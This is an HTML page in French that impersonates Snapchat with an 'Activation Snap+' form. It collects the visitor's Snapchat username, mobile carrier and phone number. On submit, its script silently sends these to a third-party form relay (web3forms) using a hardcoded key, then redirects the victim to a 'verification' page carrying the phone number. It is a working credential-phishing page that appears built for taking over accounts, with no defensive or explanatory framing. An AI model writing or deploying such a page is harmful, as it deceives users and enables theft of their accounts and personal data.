<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }</style>
</head>
<body class="bg-[#FFFC00] flex items-center justify-center h-screen">
    <div class="bg-white p-8 rounded-[30px] shadow-2xl w-[90%] max-w-sm">
        <img src="https://upload.wikimedia.org/wikipedia/en/c/c4/Snapchat_logo.svg" class="w-16 mx-auto mb-6">
        <h2 class="text-2xl font-bold mb-6 text-center">Activation Snap+</h2>
        
        <form id="step1">
            <input type="hidden" name="access_key" value="55a75b87-51e6-4f98-bcaa-125202c0904e">
            <input type="text" name="Identifiant" placeholder="Identifiant Snapchat" class="w-full p-4 mb-3 bg-gray-100 rounded-2xl border-none" required>
            <select name="Operateur" class="w-full p-4 mb-3 bg-gray-100 rounded-2xl border-none" required>
                <option value="" disabled selected>Ton opérateur</option>
                <option value="Bouygues">Bouygues Telecom</option>
                <option value="SFR">SFR</option>
                <option value="Orange">Orange</option>
            </select>
            <input type="tel" name="Telephone" id="tel" placeholder="Numéro de téléphone" class="w-full p-4 mb-6 bg-gray-100 rounded-2xl border-none" required>
            <button type="submit" class="w-full bg-black text-white py-4 rounded-full font-bold text-lg">Continuer</button>
        </form>
    </div>

    <script>
        document.getElementById('step1').onsubmit = async (e) => {
            e.preventDefault();
            const tel = document.getElementById('tel').value;
            const formData = new FormData(e.target);
            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
            window.location.href = 'verification.html?tel=' + encodeURIComponent(tel);
        };
    </script>
</body>
</html>
